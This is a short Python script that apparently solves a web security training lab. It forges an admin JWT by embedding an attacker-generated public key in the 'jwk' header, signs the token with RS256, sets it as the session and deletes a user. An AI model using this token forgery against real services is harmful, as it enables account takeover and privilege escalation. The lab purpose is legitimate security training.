import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, generate_rsa_key, get_session_token, jwk_from_public_key, lab_session, set_session, sign_rs256


lab = lab_session("JWT authentication bypass via jwk header injection")
lab.login("wiener", "peter")

private_key = generate_rsa_key()
header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "RS256"
header["jwk"] = jwk_from_public_key(private_key.public_key(), "vedant")
forged = sign_rs256(header, payload, private_key)

set_session(lab, forged)
delete_carlos(lab)

